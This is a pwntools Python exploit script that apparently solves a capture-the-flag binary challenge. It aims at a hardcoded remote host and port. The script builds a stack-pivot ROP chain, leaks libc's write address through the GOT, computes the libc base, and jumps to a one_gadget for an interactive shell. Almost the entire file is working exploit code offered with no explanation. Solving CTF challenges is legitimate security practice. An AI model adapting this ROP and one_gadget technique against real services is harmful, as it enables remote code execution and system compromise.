#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11101 ./soal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
host = args.HOST or '188.166.177.88'
port = int(args.PORT or 11101)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x0000000000401218
b *0x000000000040121e
c
# c
# c
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc=ELF("./libc.so.6")
# libc = ELF("./libc6_2.31-9_amd64.so")


pop_rsi     = 0x0000000000401299
pop_rdi     = 0x000000000040129b
pop_rsp_3   = 0x0000000000401295
pop_r12_3   = 0x0000000000401294
leave       = 0x000000000040121e

p =  p64(0x0000000000404068) 
p += p64(0x00000000004011c5) # <+8>:     mov    edx,0x5
io.sendafter("yow: ", p)

p =  "a" * 8
p += p64(exe.sym["buff_another"])
p += p64(leave) # leave
io.sendafter("yaharo: ", p)
#
p = p64(pop_rsi)
io.sendafter("yow: ", p)
#
p = p64(0)
p += p64(0x0000000000404070) 
p += p64(0x00000000004011e0) # 0x4011e0 <fun1+35>:  lea    rsi,[rip+0x2e69]
io.sendafter("yaharo: ", p)
#
p = p64(pop_rsi)
p += p64(exe.got['write']) # alarm setvbuf write read
p += p64(0)
io.send(p)
sleep(1)
#
p = p64(0x00000000004011d1) #  <+20>:    mov    edi,0x1
p += p64(pop_rsp_3)
p += p64(0x404038) # rsp
io.sendafter("yaharo: ", p)

leak = u64(io.recv(6).ljust(8,'\x00'))
print ('[+] Write Address :',hex(leak))

libc.address = leak - libc.sym["write"]
print ('[+] Base Libc Address :',hex(libc.address))

off = [0xcbd1a, 0xcbd1d, 0xcbd20]
one_gadget = libc.address + off[0]

p = p64(pop_r12_3)
p += p64(0)
io.send(p)
sleep(1)

p = p64(pop_rsp_3)
p += p64(0x404038)# rsp
p += p64(one_gadget)
io.sendafter("yaharo: ", p)

io.interactive()
